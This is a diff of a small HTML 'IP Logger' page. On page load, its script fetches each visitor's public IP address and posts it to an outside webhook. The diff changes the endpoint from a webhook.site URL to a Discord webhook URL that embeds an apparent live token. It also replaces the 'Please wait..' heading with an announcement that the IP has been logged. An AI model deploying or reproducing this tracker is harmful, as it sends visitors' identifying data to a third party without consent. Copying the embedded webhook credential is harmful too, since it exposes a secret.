@@ -6,17 +6,24 @@
     <title>IP Logger</title>
 </head>
 <body>
-    <h1> Please wait..</h1>
+    <h1>Your IP address has been logged</h1>
     <script>
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                fetch('https://webhook.site/6ad0478b-144c-4603-a9ff-21af8d89390c', {
+                const ip = data.ip;
+                const webhookUrl = 'https://discord.com/api/webhooks/1256722907120533585/tAJ8scYaxDkE_iNrwQlWQDZbcNUbF6nelDyV3iobumge0Vtb7roVV2avQk9vpNio22R2';
+
+                const payload = JSON.stringify({
+                    content: `New IP logged: ${ip}`
+                });
+
+                fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ ip: data.ip })
+                    body: payload
                 });
             })
             .catch(error => console.error('Error fetching IP:', error));
